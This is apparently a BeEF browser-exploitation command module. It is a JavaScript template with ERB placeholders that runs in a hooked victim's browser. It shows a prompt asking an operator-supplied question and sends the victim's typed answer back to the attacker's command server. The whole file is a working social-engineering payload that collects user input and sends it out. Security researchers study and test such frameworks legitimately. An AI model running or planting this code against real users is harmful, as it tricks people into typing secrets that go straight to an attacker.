beef.execute(function() {
  
  var answer = prompt("<%== @question %>","")
  beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'answer='+escape(answer));
});